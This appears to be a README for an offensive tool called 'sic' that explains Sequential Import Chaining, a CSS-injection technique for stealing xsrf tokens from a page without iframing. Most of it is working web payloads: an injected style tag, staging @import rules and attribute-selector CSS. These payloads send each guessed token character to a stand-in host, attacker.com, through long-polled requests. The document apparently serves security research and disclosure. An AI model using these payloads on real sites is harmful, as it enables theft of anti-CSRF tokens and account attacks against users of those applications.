# Sequential Import Chaining

Typical CSS injection requires an attacker to load the context a number of times to exfiltrate sensitive tokens from a page. Usually the vector for this is via iframing which isn't always possible, especially if the target is using `x-frame-options: deny` or `x-frame-options: sameorigin`. This can be further complicated if the victim needs to interact with the target to trigger the injection (perhaps due to dynamic behavior on the page).

Sequential import chaining is a technique that enable a quicker, easier, token exfiltration even in the cases where framing isn't possible or the dynamic context is only occasionally realized.

## Prerequisites

This attack only works if the attacker at least one of these: 

* Script tag injection (HTML injection, for example)
* Control of CSS at the top of a style tag.

The first case is probably more likely and will work even if filtered through vanilla DOM Purify.

## Technique

The idea behind CSS injection token exfiltration is simple: You need the browser to evaluate your malicious css once, send an outbound request with the next learned token, and repeat. 

Obviously the "repeat" part is normally done using a full frame reload (iframing, or tabs... blah).

However, we don't actually need to reload the frame to get the browser to reevaluate *new* CSS.

Sequential Import Chaining uses 3 easy steps to trick some browser into performing multiple evaluations:

1. Inject an `@import` rule to the staging payload 
2. Staging payload uses `@import` to begin long-polling for malicious payloads
3. Payloads cause browser to call out using `background-img: url(...)` causing the next long-polled `@import` rule to be generated and returned to the browser.

## Example

Here's an example of what these might look like:

### Payload
`<style>@import url(http://attacker.com/staging);</style>`

### Staging
```
@import url(http://attacker.com/lp?len=0);
@import url(http://attacker.com/lp?len=1);
@import url(http://attacker.com/lp?len=2);
...
@import url(http://attacker.com/lp?len=31); // in the case of a 32 char long token
```

### Long-polled Payload (length 0)
This is a unique, configurable template in `sic` because this part is very context specific to the vulnerable application.
```
input[name=xsrf][value^=a] { background: url(http://attacker.com/exfil?t=a); }
input[name=xsrf][value^=b] { background: url(http://attacker.com/exfil?t=b); }
input[name=xsrf][value^=c] { background: url(http://attacker.com/exfil?t=c); }
...
input[name=xsrf][value^=Z] { background: url(http://attacker.com/exfil?t=Z); }
```

After the browser calls out to `http://attacker.com/exfil?t=<first char of token>`, `sic` records the token, generate the next long-polled payload, and return a response for `http://attacaker.com/lp?len=1`. 

### Long-polled Payload (length 1 - given `s` as first char)
```
input[name=xsrf][value^=sa] { background: url(http://attacker.com/exfil?t=sa); }
input[name=xsrf][value^=sb] { background: url(http://attacker.com/exfil?t=sb); }
input[name=xsrf][value^=sc] { background: url(http://attacker.com/exfil?t=sc); }
...
input[name=xsrf][value^=sZ] { background: url(http://attacker.com/exfil?t=sZ); }
```

This repeats until no more long-polled connections are open.

----

Shoutout to the following hackers for help in one way or another.

* [0xacb](https://twitter.com/0xACB)
* [cache-money](https://twitter.com/itscachemoney)
* [Shubs](https://twitter.com/infosec_au)
* [Sean](https://twitter.com/seanyeoh)
* [Ruby](https://twitter.com/_ruby)
* [vila](https://twitter.com/cgvwzq)
